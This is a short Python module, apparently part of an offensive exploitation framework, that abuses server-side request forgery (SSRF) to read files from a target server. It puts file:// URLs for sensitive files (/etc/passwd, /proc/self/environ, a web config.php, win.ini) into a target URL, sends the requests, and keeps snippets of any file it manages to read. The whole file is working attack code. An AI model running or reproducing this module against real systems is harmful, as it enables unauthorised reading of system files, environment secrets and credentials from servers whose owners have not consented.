from modules.exploit_manager import BaseModule
from utils.logger import Logger

class FileRead(BaseModule):
    SENSITIVE_FILES = [
        "/etc/passwd",
        "/etc/hosts",
        "/proc/self/environ",
        "/var/www/html/config.php",
        "C:/Windows/win.ini"
    ]

    async def run(self, target_url: str, **kwargs):
        results = {}
        Logger.info("Attempting to read sensitive files via file:// protocol...")
        
        for file_path in self.SENSITIVE_FILES:
            payload = f"file://{file_path}"
            res = await self.engine.get(target_url.replace("SSRF", payload))
            
            if res.get("status") == 200 and len(res.get("body", "")) > 0:
                # Basic check to avoid false positives (like landing pages)
                if "root:" in res["body"] or "extensions" in res["body"]:
                    Logger.success(f"Successfully read: {file_path}")
                    results[file_path] = res["body"][:200] + "..." # Snippet
        
        return results
